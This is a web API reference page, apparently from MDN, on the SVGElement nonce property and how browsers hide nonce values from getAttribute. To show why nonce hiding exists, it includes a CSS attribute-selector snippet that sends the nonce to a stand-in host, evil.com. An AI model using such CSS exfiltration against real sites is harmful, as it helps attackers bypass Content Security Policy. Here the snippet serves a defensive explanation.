---
title: "SVGElement: nonce property"
short-title: nonce
slug: Web/API/SVGElement/nonce
page-type: web-api-instance-property
browser-compat: api.SVGElement.nonce
---

{{APIRef("SVG")}}

The **`nonce`** property of the {{DOMxRef("SVGElement")}} interface returns the nonce that is used by [Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.

## Value

A String; the cryptographic nonce, or an empty string if no nonce is set.

## Examples

### Retrieving a nonce value

In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) as a fallback:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`svg['nonce']`) will be the only way to access nonces.

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this CSS selector:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Specifications

{{Specifications}}

## Browser compatibility

{{Compat}}

## See also

- {{domxref("HTMLElement.nonce")}} a similar method for HTML elements.
- [`nonce` global attribute](/en-US/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
